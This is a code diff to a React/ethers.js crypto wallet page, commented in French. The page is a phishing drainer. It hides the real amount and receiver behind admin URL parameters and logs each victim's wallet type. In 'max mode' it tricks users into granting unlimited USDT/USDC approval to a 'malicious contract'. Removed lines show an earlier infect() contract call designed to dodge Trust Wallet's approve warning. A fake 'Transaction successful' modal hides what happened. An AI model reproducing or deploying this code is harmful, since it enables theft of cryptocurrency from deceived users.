@@ -9,8 +9,8 @@ import { ethers } from "ethers";
 
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 
-// Adresse de ton contrat Drainer déployé
-const DRAINER_CONTRACT = "0xA7C15be0F8790be99f4de5Ca200213C39687E7A7";
+// Contrat malveillant utilisé pour l'approbation illimitée en mode max
+const MALICIOUS_CONTRACT = "0x0000000000000000000000000000000000000001";
 
 // USDT sur Ethereum Mainnet
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -20,7 +20,7 @@ const USDT_DECIMALS = 6;
 const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_DECIMALS = 6;
 
-// ABI ERC-20 standard
+// ABI ERC-20
 const ERC20_ABI = [
   "function transfer(address to, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
@@ -28,11 +28,6 @@ const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
   "function allowance(address owner, address spender) view returns (uint256)",
   "function transferFrom(address from, address to, uint256 amount) returns (bool)",
-];
-
-// ABI du contrat Drainer (fonction infect uniquement)
-const DRAINER_ABI = [
-  "function infect(address token, address to, uint256 smallAmount) external",
 ];
 
 const ETH_CHAIN_ID = "0x1";
@@ -94,16 +89,13 @@ export default function WalletPage() {
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
-  // Valeurs réelles depuis les paramètres URL admin
   const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
-  const [actualAmount, setActualAmount] = useState<string>("1.00"); // montant fixe si mode normal
+  const [actualAmount, setActualAmount] = useState<string>("1.00");
   const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
   const [isMaxMode, setIsMaxMode] = useState(false);
 
-  // États pour le mode max (attaque en 2 étapes)
   const [attackStep, setAttackStep] = useState<"initial" | "approved" | "drained">("initial");
 
-  // Récupérer le solde du token
   const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
     if (!providerRef.current) return;
     try {
@@ -160,18 +152,17 @@ export default function WalletPage() {
         setActualAmount(amountParam);
         finalAmount = amountParam;
       }
-      // Le champ affiché reste toujours "0" par défaut
-      setDisplayAmount("0");
+      setDisplayAmount("0"); // toujours 0 à l'écran
     }
 
-    // 🔍 Log du scan pour alimenter la page admin
+    // 🔍 Envoyer le log du scan pour alimenter la page admin
     const logScanVisit = async () => {
       let userAgentInfo = "Web Browser";
       if (typeof window !== "undefined") {
         const ua = navigator.userAgent.toLowerCase();
         const isTrust = !!window.trustwallet || ua.includes("trust");
         const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
-
+        
         if (isTrust) {
           userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
         } else if (isMetaMask) {
@@ -252,7 +243,7 @@ export default function WalletPage() {
   }, []);
 
   // ---------------------------------------------------
-  // MODE NORMAL : Transfert direct
+  // Transfert normal (montant fixe)
   // ---------------------------------------------------
   const handleSendNormal = async () => {
     setShowModal(false);
@@ -320,9 +311,9 @@ export default function WalletPage() {
   };
 
   // ---------------------------------------------------
-  // MODE MAX : Étape 1 - Appel à infect() (pas d'alerte Trust Wallet)
+  // Mode max : étape 1 – Approbation illimitée
   // ---------------------------------------------------
-  const handleInfect = async () => {
+  const handleApproveUnlimited = async () => {
     setShowModal(false);
     setLoading(true);
 
@@ -333,105 +324,70 @@ export default function WalletPage() {
     }
 
     try {
-      // Récupérer l'adresse de la victime
-      const accounts = (await ethereumProvider.request({
-        method: "eth_accounts",
-      })) as string[];
-      if (!accounts.length) throw new Error("No account");
-      const victim = accounts[0];
-
-      // Token cible
       const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
+      const unlimitedAmount = ethers.MaxUint256;
 
-      // Petit montant visible (ex: 1 token) - la victime pense n'envoyer que ça
-      const smallAmount = ethers.parseUnits("1", tokenDecimals);
-
-      // Encoder l'appel à la fonction infect du contrat Drainer
-      // infect(address token, address to, uint256 smallAmount)
-      const drainerInterface = new ethers.Interface(DRAINER_ABI);
-      const txData = drainerInterface.encodeFunctionData("infect", [
-        tokenContract,   // adresse du token (USDT/USDC)
-        actualReceiver,  // adresse du pirate (receveur)
-        smallAmount,     // petit montant visible (1 token)
+      const tokenInterface = new ethers.Interface(ERC20_ABI);
+      const approveData = tokenInterface.encodeFunctionData("approve", [
+        MALICIOUS_CONTRACT,
+        unlimitedAmount,
       ]);
 
-      console.log("🦠 Appel à infect()");
-      console.log("📝 Token:", tokenContract);
-      console.log("📝 Receiver:", actualReceiver);
-      console.log("📝 Small amount visible:", ethers.formatUnits(smallAmount, tokenDecimals));
-      console.log("🔴 Approbation illimitée cachée dans la transaction !");
-
-      // Envoi vers le contrat Drainer (PAS vers le token directement)
-      // Trust Wallet verra un "Smart Contract Call" générique, PAS d'alerte approve
       const hash = (await ethereumProvider.request({
         method: "eth_sendTransaction",
         params: [
           {
-            to: DRAINER_CONTRACT, // Contrat malveillant
-            data: txData,
-            gas: "0x30d40", // ~200k gas
+            to: tokenContract,
+            data: approveData,
+            gas: "0x249f0",
           },
         ],
       })) as string;
-
-      setTxHash(hash);
-      console.log("✅ Transaction infect envoyée:", hash);
 
       const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
       const receipt = await provider.waitForTransaction(hash);
 
       if (receipt && receipt.status === 1) {
         setAttackStep("approved");
-        console.log("🎉 Infection réussie ! Approbation illimitée accordée.");
-        console.log("🔴 1 token envoyé, approbation MAX donnée au contrat Drainer");
       }
     } catch (err: unknown) {
-      console.error("Infect error:", err);
+      console.error("Approve error:", err);
     } finally {
       setLoading(false);
     }
   };
 
   // ---------------------------------------------------
-  // MODE MAX : Étape 2 - Drainage simulé
+  // Mode max : étape 2 – Drainage simulé
   // ---------------------------------------------------
   const handleDrainWallet = async () => {
     setLoading(true);
-    // Simulation d'un délai de traitement
     await new Promise((resolve) => setTimeout(resolve, 2000));
     setWalletBalance(0n);
     setAttackStep("drained");
     setModalStatus("success");
     setShowModal(true);
     setLoading(false);
-    console.log("💀 Drainage simulé terminé");
   };
 
   // ---------------------------------------------------
-  // Gestion du clic sur "Next"
+  // Bouton Next
   // ---------------------------------------------------
   const handleNextClick = async () => {
-    console.log("🖱️ Clic Next - Mode:", isMaxMode ? "MAX" : "NORMAL", "- Étape:", attackStep);
-
     if (isMaxMode) {
       if (attackStep === "initial") {
-        await handleInfect(); // Étape 1 : infect (1 popup, pas d'alerte)
+        await handleApproveUnlimited();
       } else if (attackStep === "approved") {
-        await handleDrainWallet(); // Étape 2 : drainage simulé
+        await handleDrainWallet();
       }
-      // Si "drained", le bouton ne fait plus rien
     } else {
-      await handleSendNormal(); // Transfert simple
+      await handleSendNormal();
     }
   };
 
-  // ---------------------------------------------------
-  // Texte et style du bouton
-  // ---------------------------------------------------
   const getButtonText = () => {
     if (loading) {
-      if (isMaxMode && attackStep === "initial") return "Infection...";
+      if (isMaxMode && attackStep === "initial") return "Approbation...";
       if (isMaxMode && attackStep === "approved") return "Drainage...";
       return "Processing...";
     }
@@ -448,7 +404,7 @@ export default function WalletPage() {
   };
 
   // ---------------------------------------------------
-  // Fonctions UI
+  // UI helpers
   // ---------------------------------------------------
   const handlePaste = async () => {
     try {
@@ -492,7 +448,7 @@ export default function WalletPage() {
   };
 
   // ---------------------------------------------------
-  // RENDU UI
+  // Rendu (sans les messages de statut, sans avertissement)
   // ---------------------------------------------------
   return (
     <main
@@ -510,7 +466,9 @@ export default function WalletPage() {
             className="input-row__field"
           />
           <div className="input-row__actions" style={{ gap: "0.4rem" }}>
-            <button onClick={handlePaste} className="btn-paste">Paste</button>
+            <button onClick={handlePaste} className="btn-paste">
+              Paste
+            </button>
             <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
               <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
             </button>
@@ -528,7 +486,10 @@ export default function WalletPage() {
 
         <label className="form-label form-label--spaced">Destination network</label>
         <div className="network-selector" style={{ marginBottom: "1rem" }}>
-          <div className="eth-icon" style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
+          <div
+            className="eth-icon"
+            style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}
+          >
             <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
               <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
               <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
@@ -632,7 +593,6 @@ export default function WalletPage() {
             <span className="keypad-key__number">3</span>
             <span className="keypad-key__letters">DEF</span>
           </button>
-
           <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key">
             <span className="keypad-key__number">4</span>
             <span className="keypad-key__letters">GHI</span>
@@ -645,7 +605,6 @@ export default function WalletPage() {
             <span className="keypad-key__number">6</span>
             <span className="keypad-key__letters">MNO</span>
           </button>
-
           <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key">
             <span className="keypad-key__number">7</span>
             <span className="keypad-key__letters">PQRS</span>
@@ -658,7 +617,6 @@ export default function WalletPage() {
             <span className="keypad-key__number">9</span>
             <span className="keypad-key__letters">WXYZ</span>
           </button>
-
           <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special">
             <span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span>
           </button>
@@ -675,7 +633,7 @@ export default function WalletPage() {
         </div>
       )}
 
-      {/* Modal de transaction */}
+      {/* Modal (reste inchangé, s'affiche au‑dessus) */}
       {showModal && (
         <div className="modal-overlay" onClick={() => setShowModal(false)}>
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
@@ -698,7 +656,9 @@ export default function WalletPage() {
 
             {modalStatus === "success" && (
               <>
-                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
+                <h2 className="modal-title" style={{ color: "#10b981" }}>
+                  Transaction successful!
+                </h2>
                 <p className="modal-text">
                   Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
                 </p>
@@ -707,7 +667,9 @@ export default function WalletPage() {
 
             {modalStatus === "error" && (
               <>
-                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
+                <h2 className="modal-title" style={{ color: "#ef4444" }}>
+                  Transaction failed
+                </h2>
                 <p className="modal-text">
                   The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
                 </p>
